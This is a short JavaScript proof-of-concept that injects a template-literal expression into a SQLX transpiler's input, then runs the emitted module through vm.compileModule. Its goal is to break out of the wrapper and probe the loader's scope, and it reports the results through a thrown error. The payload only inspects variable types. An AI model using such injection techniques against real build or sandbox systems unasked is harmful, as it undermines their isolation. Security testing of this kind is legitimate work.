var out = {};
function S(x,n){ try { return String(x).slice(0,n||500); } catch(e){ return "?"; } }
var t = require.transpiler;
// Break out of the arrow: close the fn, then close the module wrapper, then touch the loader scope.
var payload = 'SELECT ${ (function(){ globalThis.__BRK = (typeof __dirname) + "/" + (typeof module) + "/" + (typeof f); })() } AS x';
var emitted = String(t('config { type: "view" }\n' + payload, "/brk.sqlx"));
out.has_dirname_ctx = emitted.indexOf("__dirname") >= 0;
// Now actually compile+run it through vm.compileModule the way the loader does, and read the result
try {
  var h = "/brk.sqlx";
  var wrapped = "\n ((module, exports, __dirname, __filename) => {\n " + emitted + "\n })";
  var fn = vm.compileModule(h, wrapped);
  var m = {exports:{}};
  fn(m, m.exports, "/", h);
  out.ran = "OK";
} catch(e){ out.ran = "E:" + S(e, 200); }
out.brk = S(globalThis.__BRK, 120);
throw new Error("BRK::" + JSON.stringify(out));
